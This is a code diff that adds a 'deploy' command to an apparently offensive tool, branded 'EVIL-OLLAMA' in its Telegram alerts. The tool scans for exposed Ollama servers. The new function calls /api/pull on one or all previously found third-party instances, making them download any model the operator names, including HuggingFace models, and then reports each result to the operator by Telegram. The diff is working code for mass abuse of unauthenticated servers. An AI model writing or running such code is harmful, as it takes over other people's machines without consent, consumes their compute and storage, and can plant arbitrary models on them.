@@ -26,6 +26,10 @@ Usage:
   ./launcher.sh models --target 1.2.3.4:11434       # List models
   ./launcher.sh models --pull target model_name     # Download model
   ./launcher.sh models --analyze target model_name  # Analyze model details
+  
+  # -- DEPLOY / PUSH MODEL --
+  ./launcher.sh deploy --model gemma:2b --all        # Push model to ALL found instances
+  ./launcher.sh deploy --model gemma:2b --target 1.2.3.4:11434  # Push to specific target
 
   # -- PROXY --
   ./launcher.sh proxy --target 1.2.3.4:11434   # Start proxy (OpenAI compatible)
@@ -1214,6 +1218,84 @@ def pull_model(target: str, model_name: str) -> bool:
         return False
 
 # ============================================================
+# DEPLOY / PUSH MODEL TO REMOTE INSTANCE
+# ============================================================
+
+def deploy_model_to_instance(target: str, model_name: str) -> dict:
+    """
+    Make a remote Ollama instance pull/download a model from HuggingFace/Ollama registry.
+    Uses /api/pull on the target to initiate model download.
+    Uses stream=true + long timeout to handle large model downloads.
+    """
+    if not target.startswith("http"):
+        target = f"http://{target}"
+    target = target.rstrip("/")
+    
+    import requests
+    log(f"📦 Deploying model '{model_name}' to {target}...", "MODEL")
+    
+    try:
+        # First verify the instance is alive
+        health = requests.get(f"{target}/api/tags", timeout=5)
+        if health.status_code != 200:
+            log(f"  ❌ {target} → Instance not reachable (HTTP {health.status_code})", "ERROR")
+            return {"target": target, "model": model_name, "status": f"Unreachable HTTP {health.status_code}", "success": False}
+        
+        # Initiate model pull on remote instance (streaming, long timeout)
+        log(f"  ⏳ Pulling '{model_name}' — this may take several minutes...", "WAIT")
+        resp = requests.post(
+            f"{target}/api/pull",
+            json={"name": model_name, "stream": False},
+            timeout=600  # 10 minute timeout for model download
+        )
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            status = data.get("status", "unknown")
+            log(f"  ✅ {target} → {model_name}: {status}", "OK")
+            
+            # Notify
+            cfg = get_config()
+            if cfg.get("telegram_token") and cfg.get("telegram_chat_id"):
+                msg = (
+                    f"🦙 *EVIL-OLLAMA DEPLOY*\n"
+                    f"📦 *Model:* `{model_name}`\n"
+                    f"🎯 *Target:* `{target}`\n"
+                    f"📋 *Status:* {status}"
+                )
+                send_telegram(msg, cfg["telegram_token"], cfg["telegram_chat_id"])
+            
+            return {"target": target, "model": model_name, "status": status, "success": True}
+        else:
+            log(f"  ❌ {target} → HTTP {resp.status_code}: {resp.text[:200]}", "ERROR")
+            return {"target": target, "model": model_name, "status": f"HTTP {resp.status_code}", "success": False}
+            
+    except Exception as e:
+        log(f"  ❌ {target} → Error: {e}", "ERROR")
+        return {"target": target, "model": model_name, "status": str(e), "success": False}
+
+def deploy_model_to_all(model_name: str) -> list:
+    """Deploy model to all saved instances"""
+    instances = load_found()
+    if not instances:
+        log("No saved instances found. Run a scan first!", "ERROR")
+        return []
+    
+    log(f"📦 Deploying model '{model_name}' to {len(instances)} instance(s)...", "STEP")
+    results = []
+    for inst in instances:
+        ip = inst.get("ip") or inst.get("host") or inst.get("target", "")
+        port = inst.get("port", 11434)
+        target = f"{ip}:{port}"
+        result = deploy_model_to_instance(target, model_name)
+        results.append(result)
+    
+    success = sum(1 for r in results if r.get("success"))
+    failed = len(results) - success
+    log(f"📊 Deploy complete: {success} succeeded, {failed} failed", "SUMMARY")
+    return results
+
+# ============================================================
 # TELEGRAM NOTIFIER
 # ============================================================
 
@@ -2023,6 +2105,10 @@ Examples:
   ./launcher.sh models --target 1.2.3.4:11434
   ./launcher.sh models --pull target model_name
   
+  # DEPLOY
+  ./launcher.sh deploy --model gemma:2b --all
+  ./launcher.sh deploy --model gemma:2b --target 1.2.3.4:11434
+  
   # EXPORT
   ./launcher.sh export --format html
   
@@ -2075,6 +2161,13 @@ Examples:
     sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
     sp.add_argument("--pull", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Pull model info from target")
     sp.add_argument("--analyze", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Deep analyze a specific model")
+    
+    # ─── DEPLOY / PUSH MODEL ───
+    sp = subparsers.add_parser("deploy", help="Push/pull a HuggingFace model onto remote Ollama instances")
+    sp.add_argument("--model", "-m", type=str, required=True, help="Model name to deploy (e.g., gemma:2b, hf.co/username/model)")
+    sp.add_argument("--target", "-t", type=str, help="Specific target (ip:port)")
+    sp.add_argument("--all", action="store_true", help="Deploy to ALL saved instances")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── PROXY ───
     sp = subparsers.add_parser("proxy", help="Start proxy to remote Ollama instance (OpenAI compatible)")
@@ -2283,6 +2376,24 @@ Examples:
                 log(f"Error: {e}", "ERROR")
         else:
             log("Specify --target, --pull, or --analyze", "ERROR")
+    
+    elif args.command == "deploy":
+        import requests
+        model = args.model
+        log(f"📦 DEPLOY MODE: Pushing model '{model}' to Ollama instances...", "STEP")
+        
+        if args.all:
+            log(f"📦 Deploying to ALL saved instances...", "INFO")
+            deploy_model_to_all(model)
+        elif args.target:
+            log(f"📦 Deploying to {args.target}...", "INFO")
+            result = deploy_model_to_instance(args.target, model)
+            if result.get("success"):
+                log(f"✅ Model '{model}' deployed to {args.target}", "OK")
+            else:
+                log(f"❌ Failed to deploy to {args.target}: {result.get('status')}", "ERROR")
+        else:
+            log("Specify --target or --all", "ERROR")
     
     elif args.command == "proxy":
         if args.socks:
